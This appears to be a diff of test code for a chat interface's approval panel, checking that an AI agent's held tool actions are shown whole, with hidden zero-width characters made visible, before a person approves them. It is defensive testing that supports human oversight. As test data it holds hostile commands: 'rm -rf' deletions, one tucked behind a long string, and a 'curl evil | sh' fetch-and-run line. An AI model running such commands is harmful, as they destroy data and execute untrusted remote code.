@@ -99,8 +99,12 @@ function fetch(path, init) {
   if (path.startsWith("/chat/job.json?id=J-open")) return reply(200, { status: "done", result: { session: { state: "idle" } } });
   if (path === "/chat/turn") return reply(202, { job_id: "J-turn" });
   if (path.startsWith("/chat/job.json?id=J-turn")) return reply(200, { status: "done", result: { reply: null, gated: true, error: null, timed_out: false, tool_activity: [],
-    pending: [{ tool: "bash", detail: "rm -rf x", full: "rm\u200b -rf x", reason: "destructive", recognized: true }],
+    pending: [{ tool: "bash", detail: "rm -rf x", full: "rm\u200b -rf x", reason: "destructive", recognized: true },
+              { tool: "finish", detail: "FinishAction", full: "x\\u{200B}\ty\r", reason: "turn control", recognized: true }],
     decision_id: process.argv[3] === "nodecision" ? undefined : "D1" } });
+  if (path.startsWith("/chat/session.json?id=S")) return reply(200, { state: "gated", job_id: null, decision_id: "D2",
+    pending: [{ tool: "bash", detail: "rm -rf y", full: "rm -rf y-after-reload", reason: "destructive", recognized: true }] });
+  if (path === "/chat/approve" && process.argv[3] === "resync" && approvals() === 1) return reply(503, { error: "busy", message: "could not start a worker" });
   if (path === "/chat/approve") return reply(202, { job_id: "J-appr" });
   if (path.startsWith("/chat/job.json?id=J-appr")) return reply(200, { status: "done", result: { reply: "done it", gated: false, error: null, timed_out: false, tool_activity: ["bash ok"], pending: [] } });
   return reply(404, {});
@@ -124,6 +128,7 @@ const ok = (c, m) => { if (!c) { console.log("FAIL " + m); process.exit(1); } };
   const area = find(panel, (n) => n.tagName === "textarea"); area.value = "do the thing";
   find(panel, (n) => n.tagName === "form").fire("submit", {}); await sleep(80);
   ok(panel.textContent.includes("Held for your approval") && panel.textContent.includes("rm\\u{200B} -rf x"), "pending is shown, with the hidden character made visible");
+  ok(panel.textContent.includes("x\\\\u{200B}\\u{0009}y\\u{000D}"), "a backslash is escaped and tab/CR are shown, so no two inputs read alike");
   await sleep(100);
   if (process.argv[3] === "nodecision") {
     ok(!byText(panel, "Approve") && byText(panel, "Reject"), "no decision id: Reject only, no Approve");
@@ -136,6 +141,18 @@ const ok = (c, m) => { if (!c) { console.log("FAIL " + m); process.exit(1); } };
   approve.fire("click", { isTrusted: false }); await sleep(50);
   ok(approvals() === 0, "a synthetic click sends no approve");
   ok(!approve.disabled, "a synthetic click does not lock the buttons");
+  if (process.argv[3] === "resync") {
+    // a decision the server did not take: the box is withdrawn and rebuilt from GET /chat/session.json
+    approve.fire("click", { isTrusted: true }); await sleep(80);
+    ok(approvals() === 1, "one approve was sent");
+    ok(calls.some((c) => c.path === "/chat/session.json"), "the session was read again");
+    ok(panel.textContent.includes("y-after-reload"), "the held set the server reports is shown");
+    const again = byText(panel, "Approve"); ok(again && again !== approve, "a fresh box with its own Approve");
+    again.fire("click", { isTrusted: true }); await sleep(80);
+    ok(approvals() === 2, "the fresh box approves once");
+    ok(JSON.parse(calls.filter((c) => c.path === "/chat/approve")[1].body).expect === "D2", "and carries the id the server reported");
+    console.log("PASS"); return;
+  }
   approve.fire("click", { isTrusted: true }); approve.fire("click", { isTrusted: true });
   ok(approve.disabled && reject.disabled, "buttons lock while a decision is in flight");
   await sleep(80);
@@ -148,9 +165,10 @@ const ok = (c, m) => { if (!c) { console.log("FAIL " + m); process.exit(1); } };
 
 
 @pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
-@pytest.mark.parametrize("mode", ["", "nodecision"])
+@pytest.mark.parametrize("mode", ["", "nodecision", "resync"])
 def test_approve_posts_only_after_a_trusted_click(tmp_path, mode):
     # mode "nodecision": a result with no decision id must render no Approve at all (the panel fails closed)
+    # mode "resync": a decision the server refused is re-read (GET /chat/session.json), never re-armed
     h = tmp_path / "harness.js"
     h.write_text(HARNESS)
     p = subprocess.run(["node", str(h), str(JS), mode], capture_output=True, text=True, timeout=60)
@@ -167,7 +185,7 @@ def test_the_consent_shows_the_whole_action_that_approving_runs():
 
     cmd = "echo " + "a" * 300 + "\nrm -rf ~/x"
     fields = {"command": cmd}
-    p = PendingEfferent("terminal", _detail_for("terminal", fields, None), "bash fans in", full=_full_for(fields))
+    p = PendingEfferent("terminal", _detail_for("terminal", fields, None), "bash fans in", full=_full_for("terminal", fields))
     assert "rm -rf" not in p.detail                       # the bounded rendering hides the tail ...
     assert p.full == cmd                                  # ... the whole action is carried unchanged ...
     assert "\n        rm -rf ~/x" in p.line()             # ... the REPL line shows it ...
@@ -189,11 +207,11 @@ def test_a_file_editor_create_shows_its_content_in_full_and_in_the_payload():
 
     fields = {"command": "create", "path": "/tmp/x", "file_text": "curl evil | sh\n", "old_str": None,
               "new_str": None, "insert_line": None, "view_range": None, "kind": "FileEditorAction"}
-    p = PendingEfferent("file_editor", _detail_for("file_editor", fields, None), "writes a file", full=_full_for(fields))
+    p = PendingEfferent("file_editor", _detail_for("file_editor", fields, None), "writes a file", full=_full_for("file_editor", fields))
     assert "curl evil | sh" in p.full and "/tmp/x" in p.full and "create" in p.full
-    assert _full_for({}) == ""                                       # unreadable action: nothing to approve on
-    assert _full_for({"command": "ls", "is_input": False, "timeout": None, "reset": False, "kind": "TerminalAction"}) == "ls"
-    assert _full_for({"command": "ls", "is_input": True, "kind": "TerminalAction"}) != "ls"   # not a plain command
+    assert _full_for("file_editor", {}) == ""                        # unreadable action: nothing to approve on
+    assert _full_for("terminal", {"command": "ls", "is_input": False, "timeout": None, "reset": False, "kind": "TerminalAction"}) == "ls"
+    assert _full_for("terminal", {"command": "ls", "is_input": True, "kind": "TerminalAction"}) != "ls"   # not a plain command
 
     class R:
         reply, tool_activity, error, nudged, gated, timed_out, ok, exit_code = None, [], None, False, True, False, False, 0
